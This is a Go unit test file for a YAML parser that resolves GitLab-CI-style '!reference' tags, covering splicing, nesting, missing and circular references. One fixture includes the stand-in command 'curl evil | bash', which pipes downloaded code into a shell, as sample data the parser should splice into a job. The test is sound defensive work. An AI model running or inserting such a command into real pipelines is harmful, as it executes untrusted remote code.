package parser

import (
	"testing"
	"time"

	"gopkg.in/yaml.v3"
)

// scriptLines returns the scalar script lines of a job after parsing.
func scriptLines(t *testing.T, doc *Document, job string) []string {
	t.Helper()
	top := doc.MappingNode()
	jobNode := FindKey(top, job)
	if jobNode == nil {
		t.Fatalf("job %q not found", job)
	}
	scriptNode := FindKey(jobNode, "script")
	if scriptNode == nil || scriptNode.Kind != yaml.SequenceNode {
		t.Fatalf("job %q has no script sequence", job)
	}
	var out []string
	for _, n := range scriptNode.Content {
		if n.Kind == yaml.ScalarNode {
			out = append(out, n.Value)
		}
	}
	return out
}

func TestResolveReferences_SimpleSplice(t *testing.T) {
	doc, err := Parse([]byte(`
.shared:
  script:
    - curl evil | bash
build:
  script:
    - make build
    - !reference [.shared, script]
`), "test.yml")
	if err != nil {
		t.Fatal(err)
	}
	lines := scriptLines(t, doc, "build")
	want := []string{"make build", "curl evil | bash"}
	if len(lines) != len(want) {
		t.Fatalf("got %v, want %v", lines, want)
	}
	for i := range want {
		if lines[i] != want[i] {
			t.Errorf("line %d: got %q, want %q", i, lines[i], want[i])
		}
	}
}

func TestResolveReferences_NestedReference(t *testing.T) {
	doc, err := Parse([]byte(`
.a:
  script:
    - echo a
.b:
  script:
    - !reference [.a, script]
    - echo b
build:
  script:
    - !reference [.b, script]
`), "test.yml")
	if err != nil {
		t.Fatal(err)
	}
	lines := scriptLines(t, doc, "build")
	want := []string{"echo a", "echo b"}
	if len(lines) != 2 || lines[0] != want[0] || lines[1] != want[1] {
		t.Fatalf("got %v, want %v", lines, want)
	}
}

func TestResolveReferences_Unresolvable(t *testing.T) {
	// .missing does not exist — the reference must be left intact, not panic.
	doc, err := Parse([]byte(`
build:
  script:
    - make build
    - !reference [.missing, script]
`), "test.yml")
	if err != nil {
		t.Fatal(err)
	}
	top := doc.MappingNode()
	scriptNode := FindKey(FindKey(top, "build"), "script")
	if len(scriptNode.Content) != 2 {
		t.Fatalf("expected 2 items, got %d", len(scriptNode.Content))
	}
	if !isReference(scriptNode.Content[1]) {
		t.Errorf("expected unresolved !reference to remain, got tag %q", scriptNode.Content[1].Tag)
	}
}

func TestResolveReferences_Circular(t *testing.T) {
	// .a references .b and .b references .a — must terminate.
	done := make(chan struct{})
	go func() {
		_, _ = Parse([]byte(`
.a:
  script:
    - !reference [.b, script]
.b:
  script:
    - !reference [.a, script]
build:
  script:
    - !reference [.a, script]
`), "test.yml")
		close(done)
	}()
	select {
	case <-done:
	case <-time.After(5 * time.Second):
		t.Fatal("circular reference did not terminate")
	}
}

func TestResolveReferences_MappingValue(t *testing.T) {
	// !reference used as a whole mapping value (variables block).
	doc, err := Parse([]byte(`
.vars:
  variables:
    FOO: bar
build:
  variables: !reference [.vars, variables]
  script:
    - echo hi
`), "test.yml")
	if err != nil {
		t.Fatal(err)
	}
	top := doc.MappingNode()
	vars := FindKey(FindKey(top, "build"), "variables")
	if vars == nil || vars.Kind != yaml.MappingNode {
		t.Fatalf("expected resolved variables mapping, got %+v", vars)
	}
	if foo := FindKey(vars, "FOO"); foo == nil || foo.Value != "bar" {
		t.Errorf("expected FOO=bar, got %+v", foo)
	}
}
